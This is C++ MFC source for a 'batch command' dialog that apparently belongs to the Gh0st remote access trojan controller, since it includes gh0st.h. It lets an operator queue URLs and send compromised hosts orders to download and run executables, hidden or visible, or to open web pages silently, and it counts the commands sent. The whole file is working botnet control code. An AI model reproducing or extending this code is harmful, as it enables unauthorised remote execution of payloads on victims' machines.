// BatchCommand.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "BatchCommand.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CBatchCommand dialog
DWORD CBatchCommand::CountHost=0;

CBatchCommand::CBatchCommand(CWnd* pParent /*=NULL*/)
	: CDialog(CBatchCommand::IDD, pParent)
{
	//{{AFX_DATA_INIT(CBatchCommand)
	m_Url = _T("http://127.0.0.1/1.exe");
	m_Time = 5;
	m_Auto = FALSE;
	m_Select = FALSE;
	//}}AFX_DATA_INIT
	MarkStart = FALSE;
}


void CBatchCommand::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CBatchCommand)
	DDX_Control(pDX, IDC_SPIN1, m_Spin_Time);
	DDX_Control(pDX, IDC_COMBO1, m_Combo);
	DDX_Control(pDX, IDC_LIST1, m_list);
	DDX_Text(pDX, IDC_EDIT_URL, m_Url);
	DDV_MaxChars(pDX, m_Url, 50);
	DDX_Text(pDX, IDC_EDIT_TIME, m_Time);
	DDV_MinMaxUInt(pDX, m_Time, 1, 600);
	DDX_Check(pDX, IDC_CHECK_AUTO, m_Auto);
	DDX_Check(pDX, IDC_CHECK_SELECT, m_Select);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CBatchCommand, CDialog)
	//{{AFX_MSG_MAP(CBatchCommand)
	ON_WM_CLOSE()
	ON_NOTIFY(NM_RCLICK, IDC_LIST1, OnRclickList1)
	ON_BN_CLICKED(IDC_ADDBATCH, OnAddbatch)
	ON_COMMAND(IDM_DELETEBATCH, OnDeletebatch)
	ON_BN_CLICKED(IDC_BUTTON_START, OnButtonStart)
	ON_BN_CLICKED(IDC_BUTTON_STOP, OnButtonStop)
	ON_WM_TIMER()
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CBatchCommand message handlers

BOOL CBatchCommand::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here

	m_list.SetExtendedStyle(m_list.GetExtendedStyle()|LVS_EX_GRIDLINES|LVS_EX_FULLROWSELECT);
	
	m_list.InsertColumn(0,"类型",LVCFMT_CENTER,150,0);
	m_list.InsertColumn(1,"地址",LVCFMT_CENTER,300,0);
	m_list.InsertColumn(2,"间隔时间(/秒)",LVCFMT_CENTER,100,0);
	
	SetIcon(AfxGetApp()->LoadIcon(IDR_MAINFRAME),FALSE);
	SetIcon(AfxGetApp()->LoadIcon(IDR_MAINFRAME),TRUE);

	m_Combo.SetCurSel(0);
	m_Spin_Time.SetRange(1,60);
	m_Spin_Time.SetPos(5);
	m_Spin_Time.SetBuddy(GetDlgItem(IDC_EDIT_TIME));

	GetDlgItem(IDC_BUTTON_STOP)->EnableWindow(FALSE);
	GetDlgItem(IDC_BUTTON_START)->EnableWindow(TRUE);

	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

void CBatchCommand::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
	CDialog::OnClose();
}

void CBatchCommand::OnRclickList1(NMHDR* pNMHDR, LRESULT* pResult) 
{
	// TODO: Add your control notification handler code here
	CMenu m_Menu;
	m_Menu.LoadMenu(IDR_BATCH_MENU);
	
	CMenu *pMenu;
	pMenu = m_Menu.GetSubMenu(0);

	CPoint point;
	GetCursorPos(&point);
	
	pMenu->TrackPopupMenu(TPM_LEFTBUTTON,point.x,point.y,this,NULL);

	*pResult = 0;
}

void CBatchCommand::OnAddbatch() 
{
	// TODO: Add your control notification handler code here
	
	UpdateData(TRUE);

	if(m_Url.IsEmpty())
	{
		MessageBox("地址不能为空!");
		return;
	}
	if (m_Url.GetLength()>50)
	{
		MessageBox("地址太长!");
		return;
	}


	if(m_Time<=0)
		m_Time = 1;

	DWORD iCount = m_list.GetItemCount();
	if (iCount==30)
	{
		MessageBox("无法再添加地址");
		return;
	}

	m_list.InsertItem(iCount,"",TRUE);

	CString szTemp;
	GetDlgItemText(IDC_COMBO1,szTemp);
	m_list.SetItemText(iCount,0,szTemp);

	m_list.SetItemText(iCount,1,m_Url);

	szTemp.Format("%d",m_Time);

	m_list.SetItemText(iCount,2,szTemp);
	
	if(iCount==0)
		iCount=1;
	if (iCount==29)
		iCount=30;

	szTemp.Format("还剩余%d条地址可以添加",30-iCount);
	SetDlgItemText(IDC_COUNT_LINES,szTemp);
}

void CBatchCommand::OnDeletebatch() 
{
	// TODO: Add your command handler code here
	
LOOP:
	for (int i=0;i<m_list.GetItemCount();i++)
	{
		if(m_list.GetItemState(i,LVIS_SELECTED))
		{
			m_list.DeleteItem(i);
			goto LOOP;
		}
	}

	DWORD iCount=m_list.GetItemCount();
	CString szTemp;
	szTemp.Format("还剩余%d条地址可以添加",30-iCount);
	SetDlgItemText(IDC_COUNT_LINES,szTemp);
}

struct BATCHSTR
{
	char Type;
	char URL[50];
	USHORT SleepTime;
}m_BatchStr[30]={NULL};


void CBatchCommand::OnButtonStart() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	
	SetTimer(0x100,500,NULL);

	WORD iCount = m_list.GetItemCount();
	ZeroMemory(&m_BatchStr,sizeof(m_BatchStr));

	CString szTemp;

	for (int i=0;i<iCount;i++)
	{
		szTemp = m_list.GetItemText(i,0);
		if(szTemp=="下载运行(正常运行)")
			m_BatchStr[i].Type=1;
		if(szTemp=="下载运行(隐藏运行)")
			m_BatchStr[i].Type=2;
		if(szTemp=="打开网页(正常打开)")
			m_BatchStr[i].Type=3;
		if(szTemp=="打开网页(隐藏打开)")
			m_BatchStr[i].Type=4;

		m_list.GetItemText(i,1,m_BatchStr[i].URL,50);
		
		szTemp = m_list.GetItemText(i,2);
		
		m_BatchStr[i].SleepTime=atoi(szTemp.GetBuffer(0));
	}
	
	DWORD Ret=0;

	Ret = Point->SendBatchCommand(&m_BatchStr[0],iCount*sizeof(BATCHSTR),m_Auto,m_Select);
	
	CountHost+=Ret;
	
	SetWindowText(szTemp);

	GetDlgItem(IDC_BUTTON_STOP)->EnableWindow(TRUE);
	GetDlgItem(IDC_BUTTON_START)->EnableWindow(FALSE);
}

void CBatchCommand::OnButtonStop() 
{
	// TODO: Add your control notification handler code here
	CountHost=0;
	Point->StopingBacthCommand();
	KillTimer(0x100);
	GetDlgItem(IDC_BUTTON_STOP)->EnableWindow(FALSE);
	GetDlgItem(IDC_BUTTON_START)->EnableWindow(TRUE);
}

void CBatchCommand::OnTimer(UINT nIDEvent) 
{
	// TODO: Add your message handler code here and/or call default
	if(nIDEvent==0x100)
	{
		CString szStr;
		szStr.Format("批量命令   统计:已经发送%d条命令",CountHost);
		SetWindowText(szStr);
	}
	CDialog::OnTimer(nIDEvent);
}
